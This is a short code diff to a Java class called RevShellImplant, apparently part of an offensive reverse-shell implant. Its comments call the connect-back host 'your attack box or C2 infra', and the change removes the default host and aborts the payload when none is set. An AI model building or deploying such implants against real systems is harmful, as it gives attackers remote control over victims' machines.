@@ -24,7 +24,7 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
      * Hostname, IPv4 address or IPv6 address to connect back to.
      * This should be your attack box or C2 infra.
      */
-    static volatile String CONF_LHOST = "localhost";
+    static volatile String CONF_LHOST;
 
     /**
      * TCP port number to use when connecting back.
@@ -91,6 +91,7 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
 
     private void payload() {
         if (CONF_LHOST == null || CONF_LHOST.isEmpty()) {
+            log("[!] No CONF_LHOST set! Aborting.");
             return;
         }
 
